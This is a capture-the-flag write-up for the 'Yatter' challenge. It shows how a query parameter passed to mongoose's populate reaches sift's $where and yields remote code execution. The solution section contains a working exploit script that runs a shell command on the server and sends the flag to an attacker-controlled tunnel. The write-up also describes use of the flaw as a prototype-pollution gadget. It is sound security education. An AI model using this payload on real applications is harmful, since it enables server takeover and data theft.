# Yatter Writeup (en)

## Author

@n4o847

## Challenge Overview

Opening the link, you will access a social networking site called "Yatter," similar to Twitter.
Registered users can create posts called "Yeets," follow other users, and like other users' Yeets.

![Yatter](https://i.imgur.com/C4EPeud.png)

Upon reading the distributed files, it appears that the structure of this site is roughly as follows:

- Used Libraries
  - bcrypt
  - ejs
  - express
  - express-session
  - mongoose
- Models
  - `User`
    - `username`
    - `password`
    - `following`
    - `followers`
    - `posts` (virtual)
  - `Post`
    - `author`
    - `content`
    - `likes`
- Pages
  - `/` Timeline
  - `/register` Registration Page
  - `/login` Login Page
  - `/@:username` User Profile
  - `/@:username/:postId` Post Details
- Actions
  - `/register` Register
  - `/login` Log in
  - `/logout` Log out
  - `/post` Create a post
  - `/users/:userId/follow` Follow a user
  - `/users/:userId/unfollow` Unfollow a user
  - `/posts/:postId/like` Like a post
  - `/posts/:postId/unlike` Unlike a post

The purpose of this challenge is to read a secret text file (the name is unknown) located on the server and obtain the flag.

## Vulnerability

When opening a user profile page, you notice that the tabs can be switched:

|`/@:username`|`/@:username?tab=following`|`/@:username?tab=followers`|
|:-:|:-:|:-:|
|![Yeets](https://i.imgur.com/FyMKH7w.png)|![Following](https://i.imgur.com/0qLd3Zw.png)|![Followers](https://i.imgur.com/PP1UWje.png)|

This feature is implemented with the following code.

```js
app.get("/@:username", async (req, res) => {
  const { username } = req.params;
  const tab = req.query.tab ?? "posts";

  const user = await User.findOne({ username })
    .populate(tab)
    .exec();

  const userId = req.session.userId;
  const me = await User.findById(userId);

  res.render("user", { me, user, tab });
});
```

The `User` model has the `following` and `followers` fields, which are arrays of references to other `User`s, and the `posts` field, which is a virtual field.
To materialize these fields, [mongoose](https://www.npmjs.com/package/mongoose)'s [population](https://mongoosejs.com/docs/populate.html) feature is used.

Here, it is known that in express, a `req.query` can accept not only strings, but also arrays and objects.
Additionally, mongoose's `populate` allows various options to be specifed as arguments.

Given these facts, this portion of the code appears to be quite suspicious.

Indeed, when looking at the documentation for [`Model.populate`](https://mongoosejs.com/docs/api/model.html#Model.populate()), it becomes evident that JavaScript code can be executed on MongoDB as shown below:

```js
await User.findOne({ username })
  .populate({
    path: "author",
    match: {
      $where: `...`,
    },
  })
  .exec();
```

However, it seems that the JavaScript interpreter in MongoDB has various restrictions that make it difficult to execute arbitrary code.

... Is it really so?

---

From here, it might require a bit of patience.
In conclusion, there is a vulnerability in mongoose's `populate` function that allows for arbitrary code execution, and that is what we will be looking for.

Let's trace how `populate` is invoked within mongoose.

[`Model.populate`](https://github.com/Automattic/mongoose/blob/7.6.3/lib/model.js#L4261-L4282) calls `_populate`, which in turn calls `populate` for each path, which then calls `_assign`, which finally calls `assignVals`.

In `assignVals`, you will notice [a quite suspicious snippet](https://github.com/Automattic/mongoose/blob/7.6.3/lib/helpers/populate/assignVals.js#L97-L99):

```js
      valueToSet = Array.isArray(rawIds[i]) ?
        rawIds[i].filter(sift(o.match[i])) :
        [rawIds[i]].filter(sift(o.match[i]))[0];
```

It seems that when the `match` property in the options passed to `populate` is an array, a function from the [sift](https://www.npmjs.com/package/sift) library is invoked.

This sift library converts MongoDB-like queries into filter functions, however, it handles them in JavaScript itself instead of sending BSON data to MongoDB, causing different behavior.
Reading sift's [`$where` implementation](https://github.com/crcn/sift.js/blob/225980417e49d3d1124ef7338ee8673b8da836ff/src/operations.ts#L393-L411), you can see that it dynamically generates functions using the `Function` constructor:

```js
export const $where = (
  params: string | Function,
  ownerQuery: Query<any>,
  options: Options
) => {
  let test;

  if (isFunction(params)) {
    test = params;
  } else if (!process.env.CSP_ENABLED) {
    test = new Function("obj", "return " + params);
  } else {
    throw new Error(
      `In CSP mode, sift does not support strings in "$where" condition`
    );
  }

  return new EqualsOperation(b => test.bind(b)(b), ownerQuery, options);
};
```

Exactly, by passing code like `match: [{ $where: ... }]`, arbitrary code can be executed!

Note that the code is executed within the MongoDB internal JavaScript interpreter before being executed with `Function`, so you need to distinguish where the code is executed using constructs like `typeof process === "undefined" ? true : ...`.

## Solution

Let's assume there is a registered user with the username `@a`.

```js
const express = require("express");
const localtunnel = require("localtunnel");

async function main() {
  const remoteHost = process.argv[2] ?? "localhost";
  const remotePort = parseInt(process.argv[3] ?? "18080", 10);

  const localPort = 3000;

  const app = express();

  app.get("/", (req, res) => {
    console.log(req.query.flag);
    res.send("ok");
  });

  const server = await new Promise((resolve) => {
    const server = app.listen(localPort, () => resolve(server));
  });

  const username = `a`;

  const tunnel = await localtunnel({ port: localPort });

  const payload =
    `typeof process === "undefined" ? true : fetch("${tunnel.url}/?flag=" + process.mainModule.require("child_process").execSync("cat flag-*.txt"))`;
  const params = new URLSearchParams({
    "tab[path]": "posts",
    "tab[match][][$where]": payload,
  });

  await fetch(
    `http://${remoteHost}:${remotePort}/@${username}?${params}`,
  );

  tunnel.close();
  server.close();
}

main();
```

## Further Exploitation

This vulnerability occurs only when arbitrary objects are passed to populate.
However, with prototype pollution, arbitrary code execution might occur through other means as well.
In other words, this vulnerability can be utilized as a prototype pollution gadget.

For instance, the [`Model.insertMany`](https://mongoosejs.com/docs/api/model.html#Model.insertMany()) function, which is used for bulk data insertion, takes the populate option as a parameter.
Inside `insertMany`, there is [a conditional check like this](https://github.com/Automattic/mongoose/blob/7.6.3/lib/model.js#L3242):

```js
        if (options.populate != null) {
```

Consequently, even if the `populate` option is not explicitly specified in the program, if `Object.prototype` is polluted, arbitrary code execution becomes possible.
